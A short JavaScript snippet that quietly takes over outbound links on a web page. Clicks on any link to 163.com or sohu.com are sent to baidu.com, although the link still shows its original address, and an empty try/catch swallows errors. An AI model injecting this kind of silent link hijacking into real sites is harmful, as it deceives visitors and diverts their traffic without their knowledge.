var g_goUrl="https://www.baidu.com";
var g_hookUrls=new Array();

g_hookUrls[0]="163.com"
g_hookUrls[1]="sohu.com"

function mOnFun(mthis)
{

	mthis.href=g_goUrl;

}
for(var i=0;i<=document.getElementsByTagName("a").length;i++)
{
	try 
	{
		var url=document.getElementsByTagName("a")[i].href;
		for(var x=0;x<g_hookUrls.length;x++)
		{
			if(url.indexOf(g_hookUrls[x])!=-1)
			{
				document.getElementsByTagName("a")[i].onclick=function(){mOnFun(this);};
			}
		}

	}
	catch (error)
	{

	}
}
